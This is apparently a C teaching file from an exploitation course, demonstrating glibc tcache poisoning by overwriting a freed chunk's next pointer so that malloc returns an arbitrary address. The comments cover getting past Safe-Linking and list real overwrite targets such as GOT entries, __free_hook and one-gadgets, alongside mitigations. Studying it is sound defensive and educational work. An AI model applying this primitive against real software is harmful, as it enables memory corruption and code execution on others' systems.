/* 16_tcache_poison.c  —  Chapter 5: tcache poisoning (arbitrary-alloc primitive).
 *
 * A freed tcache chunk stores a `next` pointer (singly-linked LIFO free list).
 * If a bug lets us overwrite that `next`, we choose where the SECOND malloc of
 * that size returns -> malloc hands us an arbitrary pointer -> arbitrary write.
 *
 * This file simulates the "bug" with a direct write (as a UAF/overflow would
 * give) so you can watch the mechanic without needing a separate vuln.
 *
 * RUN
 *   ./bin/16_tcache_poison
 *     target @ 0x<addr>  (before = 0)
 *     x = <chunk a>
 *     y = <&target>           <- malloc returned a pointer INTO our target!
 *     target after = 0x...    <- we wrote through the forged allocation
 *
 * SAFE-LINKING NOTE (glibc >= 2.32): `next` is stored XOR'd with (chunk>>12),
 * so on a modern glibc you must first LEAK a heap address and encode next as
 * (target ^ (chunk_addr>>12)). If the demo returns a garbled pointer, your
 * glibc has Safe-Linking — see exploits/16_tcache_poison.py for the encoded
 * version, and read Chapter 5 §5.2.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void)
{
    uint64_t target[4] = {0};
    printf("target @ %p (before = 0x%lx)\n", (void*)target, target[0]);

    char *a = malloc(0x30);       /* tcache bin for 0x40-sized chunks */
    free(a);                      /* a -> tcache[0x40]; a->next = 0 (or encoded) */

    /* THE "BUG": overwrite the freed chunk's `next` pointer with &target.
     * (A real UAF-write or heap overflow supplies this write.) On glibc with
     * Safe-Linking you'd write (target ^ ((uintptr_t)a >> 12)) instead. */
    *(uint64_t *)a = (uint64_t)target;

    char *x = malloc(0x30);       /* returns a (list head) */
    char *y = malloc(0x30);       /* returns &target  <-- the poisoned next! */
    printf("x = %p\n", (void*)x);
    printf("y = %p   (target is %p)\n", (void*)y, (void*)target);

    /* y now aliases target: writing through y writes into target. */
    memset(y, 0x41, sizeof target);
    printf("target after = 0x%lx\n", target[0]);
    return 0;
}

/* Real exploits aim `y` at a sensitive address: a GOT entry (no Full RELRO),
 * __free_hook (old glibc), a saved return address, or a function pointer, then
 * write `system`/a one-gadget there. FIX: don't create the UAF/overflow; keep a
 * modern glibc (Safe-Linking + tcache key); build Full RELRO; test with ASan. */
